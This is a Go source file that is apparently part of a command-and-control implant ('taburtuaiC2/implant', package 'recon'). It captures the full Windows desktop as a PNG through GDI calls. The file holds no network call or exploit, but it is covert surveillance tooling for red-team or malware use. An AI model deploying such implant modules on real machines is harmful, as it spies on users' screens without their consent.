//go:build windows

package recon

import (
	"bytes"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"unsafe"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

type bitmapInfoHeader struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

type bitmapInfo struct {
	BmiHeader bitmapInfoHeader
	BmiColors [1]uint32
}

func acquireDesktopDC() (uintptr, func(), error) {
	hDC, _, _ := winsyscall.ProcGetDC.Call(0)
	if hDC != 0 {
		return hDC, func() { winsyscall.ProcReleaseDC.Call(0, hDC) }, nil
	}
	hwndDesktop, _, _ := winsyscall.ProcGetDesktopWindow.Call()
	if hwndDesktop != 0 {
		hDC, _, _ = winsyscall.ProcGetWindowDC.Call(hwndDesktop)
		if hDC != 0 {
			return hDC, func() { winsyscall.ProcReleaseDC.Call(hwndDesktop, hDC) }, nil
		}
	}
	return 0, func() {}, fmt.Errorf("cannot acquire desktop DC (headless/service session?)")
}

// CaptureScreen captures the full desktop and returns PNG bytes.
func CaptureScreen() ([]byte, error) {
	width, _, _ := winsyscall.ProcGetSystemMetrics.Call(uintptr(winsyscall.SmCxscreen))
	height, _, _ := winsyscall.ProcGetSystemMetrics.Call(uintptr(winsyscall.SmCyscreen))
	w, h := int(int32(width)), int(int32(height))
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid screen dimensions: %dx%d (no display attached?)", w, h)
	}

	hDC, releaseHDC, err := acquireDesktopDC()
	if err != nil {
		return nil, err
	}
	defer releaseHDC()

	memDC, _, _ := winsyscall.ProcCreateCompatibleDC.Call(hDC)
	if memDC == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer winsyscall.ProcDeleteDC.Call(memDC)

	hBitmap, _, _ := winsyscall.ProcCreateCompatibleBitmap.Call(hDC, uintptr(w), uintptr(h))
	if hBitmap == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer winsyscall.ProcDeleteObject.Call(hBitmap)

	winsyscall.ProcSelectObject.Call(memDC, hBitmap)

	r, _, e := winsyscall.ProcBitBlt.Call(memDC, 0, 0, uintptr(w), uintptr(h), hDC, 0, 0, uintptr(winsyscall.Srccopy))
	if r == 0 {
		return nil, fmt.Errorf("BitBlt: %v (session may be headless or locked)", e)
	}

	bi := bitmapInfo{}
	bi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bi.BmiHeader))
	bi.BmiHeader.BiWidth = int32(w)
	bi.BmiHeader.BiHeight = -int32(h)
	bi.BmiHeader.BiPlanes = 1
	bi.BmiHeader.BiBitCount = 32
	bi.BmiHeader.BiCompression = uint32(winsyscall.BiRgb)

	pixels := make([]byte, w*h*4)
	r, _, e = winsyscall.ProcGetDIBits.Call(
		memDC, hBitmap,
		0, uintptr(h),
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bi)),
		uintptr(winsyscall.DibRGBColors),
	)
	if r == 0 {
		return nil, fmt.Errorf("GetDIBits: %v", e)
	}

	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			idx := (y*w + x) * 4
			img.SetRGBA(x, y, color.RGBA{
				R: pixels[idx+2],
				G: pixels[idx+1],
				B: pixels[idx+0],
				A: 255,
			})
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("png.Encode: %w", err)
	}
	return buf.Bytes(), nil
}
